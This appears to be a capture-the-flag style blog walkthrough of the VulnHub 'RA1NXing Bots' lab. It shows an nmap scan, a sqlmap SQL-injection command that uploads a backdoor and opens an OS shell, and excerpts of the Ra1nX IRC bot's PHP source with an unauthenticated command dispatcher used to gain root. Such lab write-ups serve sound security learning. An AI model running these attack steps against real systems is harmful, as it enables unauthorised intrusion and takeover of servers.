---
categories:
- vulnhub
- walkthrough
- ra1nxing
comments: false
date: "2013-07-10T22:31:29Z"
title: solving RA1NXing Bots
---

[RA1NXing Bots](http://vulnhub.com/entry/ra1nxing-bots_1,52/) is a vulnerable image intended to jump start security researches' interest in botnets and their exploitability.  This vulnerable image was brought to us by Brian Wallace ([@botnet_hunter](https://twitter.com/botnet_hunter)), a botnet security researcher at Cylance and good friend (and Ballast Security co-founder).  This was a pretty interesting  vulnerable image, and good exposure into the sometimes seedy and malevolent world of botnets.

As such, the iconic nmap:

```
# Nmap 6.25 scan initiated Mon Jul  8 02:08:29 2013 as: nmap -sS -A -T5 -p- -oN bot.scan 192.168.1.198
Nmap scan report for 192.168.1.198
Host is up (0.00044s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
| ssh-hostkey: 1024 a2:24:9c:39:48:84:7f:da:1f:51:b9:0a:1b:45:df:aa (DSA)
|_2048 35:f5:0e:fa:c3:6b:98:8a:25:e1:f8:bf:de:38:82:03 (RSA)
80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
|_http-methods: No Allow or Public header in OPTIONS response (status code 302)
| http-title: Site doesn't have a title (text/html).
|_Requested resource was /index.php?page=main
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|_  100000  2,3,4        111/udp  rpcbind
6667/tcp open  irc     IRCnet ircd
| irc-info: Server: irc.localhost
| Version: 2.11.2p2. irc.localhost 000A
| Lservers/Lusers: 0/3
| Uptime: 0 days, 0:10:37
| Source host: 192.168.1.147
|_Source ident: NONE or BLOCKED
MAC Address: 08:00:27:4B:51:94 (Cadmus Computer Systems)
Aggressive OS guesses: Linux 2.6.31 (98%), Linux 2.6.32 - 2.6.35 (97%), Linux 2.6.32 - 3.6 (96%), Netgear DG834G WAP or Western Digital WD TV media player (96%), Linux 2.6.17 - 2.6.36 (96%), Linux 2.6.23 - 2.6.38 (95%), Linux 2.6.22 (95%), Linux 2.6.18 - 2.6.21 (95%), AXIS 210A or 211 Network Camera (Linux 2.6) (95%), Linux 2.6.18 - 2.6.32 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 192.168.1.198

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done at Mon Jul  8 02:08:52 2013 -- 1 IP address (1 host up) scanned in 23.34 seconds
```

The two services of interest are the HTTP server and IRC.  The web server comprises a few links with some incredibly basic pages, one of which is an obvious front door at first glance:

{{< figure class="center" src="http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg" >}}

Grabbing the request and handing it off to sqlmap, we quickly have a shell:

```
root@jali:~/lib_mysqludf_sys-master# sqlmap -u http://192.168.1.198/index.php?page=login --data 'user=blah&password=blah' -p user --os-shell
[....]
[20:33:03] [INFO] the file stager has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpufqvr.php
[20:33:03] [INFO] the backdoor has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpbqsug.php
[20:33:03] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] a
command standard output:    'www-data'
os-shell> 
```

Dumping out the kernel and listening services doesn't give us anything new.  A local mysql database was set up, and the root password was found in `/var/www/main.php`, but we can't UDF into it due to file restrictions.  Inside the web root is source for the web site, as well as a `/var/www/botsources`, which includes the source code for the Ra1nX bot.  This source will come in handy as we explore the system more thoroughly.

At the head of the bot we've got a bunch of parameters defined; including its connection location and port:

```
$servers        = "127.0.0.1";
$ports            = "6667";
$admins            = "";
$channels        = "#somechannel";
$realnames         = "jhl";
$nicknames         = "jhl1,jhl2,jhl3,jhl4,jhl5,jhl6,jhl7,jhl8,jhl9,jhl10,jhl11,jhl12,jhl13,jhl14,jhl15,jhl16,jhl17,jhl18,jhl19,jhl20,jhl21,jhl22,jhl23,jhl24,jhl25,jhl26,jhl27,jhl28,jhl29,jhl30";
$chanpass     = "trolol";
```

If we attempt to connect to the IRC server and join the channel, we get `Cannot join to channel #somechannel (Bad channel key)`, which is the result of an incorrect password.  The source code specifies a password, but it doesn't work.  Could the bot be changed?

{{< figure class="center" src="http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg" >}}

Looks like some PHP script is being run as root; likely our culprit.  The issue now is communicating with the bot and somehow exploiting it to give us a root shell.  Time to hit that source we grabbed.

As given above, we have a list of nicknames, a channel, server, and password.  The password doesn't work, so we need to figure out another way.  The bot connects to the server using the connection() function, and selects a random nickname/server/port:

```
   while(!$SOCKET && ($try <= $maxtryconn)){
        $server = random($servers);
        $port     = random($ports);
        $SOCKET = fsockopen($server,$port,$err_num,$err_msg,30);
        $GLOBALS['SOCKET']=$SOCKET;
        $try++;
        sleep(1);
    }
    if(!$SOCKET) die("Cannot connect to remote host");
    if ($SOCKET){
        $GLOBALS['ident']     = $ident    = random($nicknames);
        $GLOBALS['nick']     = $nick     = random($nicknames);
        $GLOBALS['realname']= $realname    = random($realnames);
        SEND("USER XRay 127.0.0.1 localhost : -==Ra1NX Projection==-");
        NICK($nick);
        print "Connected to ".$server.":".$port." ".$nick." (XRay@".gethostbyname($_SERVER["HTTP_HOST"]).") Ra1NX Projection\r\n";
        flush();sleep(1);
    }
```

Once connected to a server, it begins listening for commands.  Text is read off the socket and sent to the `parser` function, which then, obviously, parses and acts upon the input.  The interesting bit to us is the following snippet:

```
  if(substr($line[3],1,strlen($line[3]))==$nick){ $pubcalled = true; }
    if($pubcalled){
        if ($typeMsg=="PRIVMSG" && $user && $pubcalled && $pubcmd) {
            if(function_exists($pubcmd)){
                $sender = "PRIVMSG ".$dropMsg." "._;
                $GLOBALS['sender'] = $sender;
                $arg = str_replace("\r","",$arg);
                $arg = str_replace("\n","",$arg);
                $pubcmd($arg);
            }
        }
    }
```

Essentially, once parsed, a valid command to the bot appears `bot nick | @command | arguments`
It's also of interest that none of this code verifies the authenticity of the request, nor that it's even coming from a channel.  All we need to do, then, is log into the IRC server and iterate through all available nicknames until we find the connected bot.

{{< figure class="center" src="http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg" >}}

Game over.  Fun image, and looking forward to future botnet scenarios.
